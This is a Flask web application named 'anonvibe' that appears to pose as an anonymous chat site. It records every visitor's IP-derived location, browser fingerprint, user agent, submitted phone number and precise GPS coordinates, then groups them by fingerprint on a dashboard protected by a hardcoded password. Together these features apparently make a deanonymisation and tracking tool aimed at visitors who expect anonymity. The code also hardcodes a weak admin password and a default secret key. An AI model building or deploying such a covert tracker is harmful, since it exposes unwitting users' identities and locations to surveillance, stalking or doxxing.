import os
import hashlib
import json
from datetime import datetime, timezone
import requests
from flask import Flask, render_template, request, jsonify, send_from_directory, session, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from flask_socketio import SocketIO, emit
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'anonvibe-dev-key-772211')
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///anonvibe.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024  # 10MB

if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.makedirs(app.config['UPLOAD_FOLDER'])

db = SQLAlchemy(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# Models
class Visit(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
    ip = db.Column(db.String(45))
    city = db.Column(db.String(100))
    region = db.Column(db.String(100))
    country = db.Column(db.String(100))
    lat = db.Column(db.Float)
    lon = db.Column(db.Float)
    isp = db.Column(db.String(255))
    fingerprint = db.Column(db.String(64))
    phone = db.Column(db.String(20))
    precise_lat = db.Column(db.Float)
    precise_lon = db.Column(db.Float)
    accuracy = db.Column(db.Float)
    user_agent = db.Column(db.Text)

class Message(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
    fingerprint = db.Column(db.String(64))
    text = db.Column(db.Text)
    attachment_path = db.Column(db.String(255))
    filename = db.Column(db.String(255))

with app.app_context():
    db.create_all()

def get_geo(ip):
    if ip in ["127.0.0.1", "::1", "localhost"]:
        return {
            "ip": ip, "city": "Lagos", "region": "Lagos", "country_name": "Nigeria",
            "latitude": 6.5244, "longitude": 3.3792, "timezone": "Africa/Lagos",
            "asn": "AS36886", "org": "MTN Nigeria Communications Ltd"
        }
    try:
        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if resp.status_code == 200:
            return resp.json()
    except:
        pass
    return {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/log', methods=['POST'])
def log_visit():
    data = request.json
    ip = request.remote_addr
    geo = get_geo(ip)
    
    visit = Visit(
        ip=ip,
        city=geo.get('city'),
        region=geo.get('region'),
        country=geo.get('country_name'),
        lat=geo.get('latitude'),
        lon=geo.get('longitude'),
        isp=geo.get('org'),
        fingerprint=data.get('fingerprint'),
        user_agent=request.headers.get('User-Agent')
    )
    db.session.add(visit)
    db.session.commit()
    return jsonify({"status": "success", "visit_id": visit.id})

@app.route('/api/submit-phone', methods=['POST'])
def submit_phone():
    data = request.json
    visit = Visit.query.filter_by(fingerprint=data.get('fingerprint')).order_by(Visit.timestamp.desc()).first()
    if visit:
        visit.phone = data.get('phone')
        db.session.commit()
    return jsonify({"status": "success"})

@app.route('/api/log-location', methods=['POST'])
def log_location():
    data = request.json
    visit = Visit.query.filter_by(fingerprint=data.get('fingerprint')).order_by(Visit.timestamp.desc()).first()
    if visit:
        visit.precise_lat = data.get('lat')
        visit.precise_lon = data.get('lon')
        visit.accuracy = data.get('accuracy')
        db.session.commit()
    return jsonify({"status": "success"})

@app.route('/api/send-attachment', methods=['POST'])
def send_attachment():
    if 'file' not in request.files:
        return jsonify({"error": "No file"}), 400
    file = request.files['file']
    fingerprint = request.form.get('fingerprint')
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400
    
    filename = secure_filename(file.filename)
    unique_filename = f"{int(datetime.now(timezone.utc).timestamp())}_{filename}"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)
    file.save(filepath)
    
    msg = Message(
        fingerprint=fingerprint,
        attachment_path=f"/uploads/{unique_filename}",
        filename=filename
    )
    db.session.add(msg)
    db.session.commit()
    
    socketio.emit('new_message', {
        'id': msg.id,
        'timestamp': msg.timestamp.isoformat(),
        'fingerprint': msg.fingerprint,
        'attachment': msg.attachment_path,
        'filename': msg.filename
    })
    
    return jsonify({"status": "success"})

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@socketio.on('send_message')
def handle_message(data):
    msg = Message(
        fingerprint=data.get('fingerprint'),
        text=data.get('text')
    )
    db.session.add(msg)
    db.session.commit()
    
    emit('new_message', {
        'id': msg.id,
        'timestamp': msg.timestamp.isoformat(),
        'fingerprint': msg.fingerprint,
        'text': msg.text
    }, broadcast=True)

@app.route('/admin')
def admin_login_page():
    if session.get('admin_logged_in'):
        return redirect(url_for('admin_dashboard'))
    return render_template('admin_login.html')

@app.route('/admin/login', methods=['POST'])
def admin_login():
    password = request.form.get('password')
    if password == 'admin123':
        session['admin_logged_in'] = True
        return redirect(url_for('admin_dashboard'))
    return "Invalid password", 401

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login_page'))
    
    # Group visits by fingerprint
    grouped_visits = {}
    all_visits = Visit.query.order_by(Visit.timestamp.desc()).all()
    for v in all_visits:
        if v.fingerprint not in grouped_visits:
            grouped_visits[v.fingerprint] = []
        grouped_visits[v.fingerprint].append(v)
    
    messages = Message.query.order_by(Message.timestamp.desc()).all()
    messages_json = json.dumps([{
        "id": m.id,
        "timestamp": m.timestamp.isoformat(),
        "fingerprint": m.fingerprint,
        "text": m.text,
        "attachment": m.attachment_path,
        "filename": m.filename
    } for m in messages], indent=2)
    
    return render_template('admin.html', grouped_visits=grouped_visits, messages=messages, messages_json=messages_json)

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login_page'))

if __name__ == '__main__':
    socketio.run(app, debug=True, port=5000)
